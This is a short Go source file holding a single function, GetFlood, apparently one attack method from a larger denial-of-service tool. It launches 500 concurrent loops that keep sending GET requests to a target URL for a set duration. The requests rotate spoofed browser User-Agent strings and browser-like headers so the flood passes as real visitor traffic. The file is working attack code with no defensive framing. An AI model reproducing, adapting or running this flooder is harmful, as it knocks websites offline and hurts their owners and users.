package methods

import (
	"math/rand"
	"net/http"
	"time"
)

func GetFlood(url string, sec int) {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	}

	cont := true
	client := &http.Client{Timeout: 5 * time.Second}

	for i := 0; i < 500; i++ {
		go func() {
			for cont {
				req, _ := http.NewRequest("GET", url, nil)
				req.Header.Set("User-Agent", agents[rand.Intn(len(agents))])
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
				req.Header.Set("Accept-Language", "en-US,en;q=0.5")
				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Upgrade-Insecure-Requests", "1")
				req.Header.Set("Cache-Control", "max-age=0")
				client.Do(req)
			}
		}()
	}

	time.Sleep(time.Duration(sec) * time.Second)
	cont = false
	time.Sleep(100 * time.Millisecond)
}
